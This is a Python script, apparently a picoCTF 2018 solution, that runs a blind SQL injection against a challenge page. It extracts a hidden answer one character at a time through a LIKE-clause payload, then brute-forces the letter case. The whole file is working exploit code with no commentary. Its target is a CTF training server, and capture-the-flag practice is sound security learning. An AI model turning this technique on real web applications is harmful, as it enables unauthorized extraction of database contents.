from requests import *
import itertools

url = 'http://2018shell.picoctf.com:36052/answer2.php'
dic = 'abcdefghijklmnopqrstuvwxyz0123456789'
ans = ''

while(True):
    for i in dic:
        answer = "123' or answer like '{}%".replace('{}' , ans + i)
        data = {
            'answer' : answer,
            'debug' : '1'
        }

        r = post(url , data=data)
        print(r.text)
        if ('You are so close.' in r.text):
            print(i , end='')
            ans += i
            break
        if (i == '9'):
            print()
            break

answers = list(map(''.join, itertools.product(*((c.lower(), c.upper()) for c in ans))))

for answer in answers:
    data = {
        'answer' : answer,
        'debug' : '1'
    }
    
    r = post(url , data=data)
    print(answer)
    if ('Perfect' in r.text):
        print(r.text)
        break
